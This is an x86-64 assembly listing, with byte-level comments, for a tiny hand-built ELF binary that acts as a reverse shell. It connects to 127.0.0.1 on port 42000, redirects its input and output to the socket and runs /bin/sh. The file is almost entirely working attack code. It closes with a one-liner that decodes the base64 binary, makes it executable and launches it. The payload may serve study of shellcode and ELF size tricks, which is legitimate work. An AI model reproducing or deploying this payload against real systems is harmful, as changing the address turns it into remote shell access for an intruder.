;-- reverse shell to 127.0.0.1 on port 42000 --------------------------------------//--
BITS 64
  org 0x100000000
;---------------------+------+-------------+------------------------------------------+
; Code Listing        | OFFS |  ASSEMBLY   | CODE COMMENT                             |
;---------------------+------+-------------+------------------------------------------+
  db 0x7F, "ELF"      ; 0x0  |    7f454c46 | Elf Magic Value
_start:               ;      |             |-- Begin socket syscall 
  push byte 0x29      ; 0x04 |        6a29 | Syscall 41 - socket 
  pop rax             ; 0x06 |          58 | Putting it into RAX 
  push byte 0x2       ; 0x07 |        6a02 | AF_INET
  pop rdi             ; 0x09 |          5f | Into RDI 
  push byte 0x1       ; 0x0A |        6a01 | SOCK_STREAM
  pop rsi             ; 0x0C |          5e | Into RSI 
  cdq                 ; 0x0D |          99 | RDX = 0 because CDQ sign extends AX/EAX and stores in DX/EDX.
  jmp short conec     ; 0x0E |       eb 3c | Then onto the rest of our code 
  dw 2                ; 0x10 |       02 00 | e_type              
  dw 0x3e             ; 0x12 |       3e 00 | e_machine           
  dd 1                ; 0x14 | 01 00 00 00 | e_version           
  dd _start - $$      ; 0x18 | 04 00 00 00 | e_entry             
phdr:                 ;      |             |-- Begin Program Header
  dd 1                ; 0x1C | 01 00 00 00 |                    [PHDR] p_type
  dd phdr - $$        ; 0x20 | 1C 00 00 00 | [EHDR] e_phoff     [PHDR] p_flags  
  dd 0                ; 0x24 | 00 00 00 00 |                    [PHDR] p_offset
  dd 0                ; 0x28 | 00 00 00 00 | [EHDR] e_shoff     
  dq $$               ; 0x2C | 00 00 00 00 |                    [PHDR] p_vaddr
                      ; 0x30 | 01 00 00 00 | [EHDR] e_flags
  dw 0x40             ; 0x34 |       40 00 | [EHDR] e_ehsize    [PHDR] p_addr 
  dw 0x38             ; 0x36 |       38 00 | [EHDR] e_phentsize 
  dw 1                ; 0x38 |       01 00 | [EHDR] e_phnum
  dw 2                ; 0x3A |       02 00 | [EHDR] e_shentsize 
execy:                ;      |             |-- Begin execve syscall
  add al, 0x3b        ; 0x3C |        043b | execve syscall
  syscall             ; 0x3E |        0f05 | Call kernel
  dd 0                ; 0x40 |             | [PHDR] p_filesz
  add al, 0x3b        ; 0x44 |        043b | execve syscall
  syscall             ; 0x46 |        0f05 | Call kernel
  dd 0                ; 0x48 | 00 00 00 00 | [PHDR] p_memsz
conec:                ;      |             |-- Begin connect syscall
  syscall             ; 0x4C |        0f05 | Execute the syscall we set up earlier.
  ;--- connect syscall ---------------------------------------------------------
  xchg rdi, rax                 ;                 4897 | Save socket descriptor
  mov dword [rsp-4], 0x100007f  ;     c74424fc7f000001 | Our IP   = 127.0.0.1
  mov word  [rsp-6], 0x10a4     ;       66c74424faa410 | Our Port = 42000
  mov byte  [rsp-8], 0x02       ;           c64424f802 | sockfd
  sub rsp, 8                    ;             4883ec08 | sub sp makes no difference
  push byte 0x2a                ;                 6a2a | Connect syscall
  pop rax                       ;                   58 | move into rax
  mov rsi, rsp                  ;               4889e6 | pointer to socket struct
  push byte 0x10                ;                 6a10 | length
  pop rdx                       ;                   5a | length -> rdx
  syscall                       ;                 0f05 | Execute the connect syscall
  ;-- syscall 0x2a - connect
  ; http://man7.org/linux/man-pages/man2/connect.2.html
  ;--- dup2 syscall ------------------------------------------------------------
  push byte 0x3                 ;                 6a03 | counter 
  pop rsi                       ;                   5e | move into rsi
dup2_loop:              
  dec rsi                       ;               48ffce | decrement before syscall. 2
  push byte 0x21                ;                 6a21 | dup2 syscall 
  pop rax                       ;                   58 | move into rax
  syscall                       ;                 0f05 | call it
  jnz dup2_loop                 ;                 75f6 | jump if not 0   
  ;-- syscall 0x21 sys_dup2    - loops 3 times
  ; dup2 duplicates the FD that is being sent. 
  ; http://man7.org/linux/man-pages/man2/dup.2.html
  ; RDI: unsigned int oldfd 
  ; RSI: unsigned int newfd = 2 -> 0 after loop
  ;--- Read Buffer -------------------------------------------------------------
  ;mov rdi, rax                 ;               4889c7 | socket - This is 0 in practice tho bc syscall success. so can actually just get rid of it.
  cdq                           ;                   99 | Converts signed long to signed double long -basically zeros out rdx as seen above
  mov byte [rsp-1], al          ;             884424ff | This is 0 already in RAX, so we are reusing this value a few times.
  sub rsp, 1                    ;             4883ec01 | 
  push rdx                      ;                   52 | 
  lea rsi, [rsp-0x10]           ;           488d7424f0 | 16 bytes from buf
  add dl, 0x10                  ;               80c210 | size_t count
  syscall                       ;                 0f05 | 
  ;-- syscall 0 sys_read 
  ; http://man7.org/linux/man-pages/man2/read.2.html
  ; RDI: unsigned int fd  - The socket fd - 3
  ; RSI: char *buf        - 16 bytes
  ; RDX: size_t count     - 0x10 
  ;--- execve /bin/sh ----------------------------------------------------------
  xor rax, rax                  ;               4831c0 | make 0
  mov rbx, 0x68732f2f6e69622f   ; 48bb2f62696e2f2f7368 | /bin//sh in reverse
  push rbx                      ;                   53 | push this string to the stack
  mov rdi, rsp                  ;               4889e7 | move pointer to the string to rdi
  push rax                      ;                   50 | push a 0 
  mov rdx, rsp                  ;               4889e2 | push pointer to 0 to rdx
  push rdi                      ;                   57 | push /bin//sh string to stack
  mov rsi, rsp                  ;               4889e6 | move pointer to it to rsi
  jmp short execy               ;                 eb8d | Back up into program headers
  
  ; One liner
  ; base64 -d <<< f0VMRmopWGoCX2oBXpnrPAIAPgABAAAABAAAAAEAAAAcAAAAAAAAAAAAAAAAAAAAAQAAAEAAOAABAAIABDsPBQAAAAAEOw8FAAAAAA8FSJfHRCT8fwAAAWbHRCT6pBDGRCT4AkiD7AhqKlhIieZqEFoPBWoDXkj/zmohWA8FdfaZiEQk/0iD7AFSSI10JPCAwhAPBUgxwEi7L2Jpbi8vc2hTSInnUEiJ4ldIiebrjQ== > s;chmod +x s;./s &
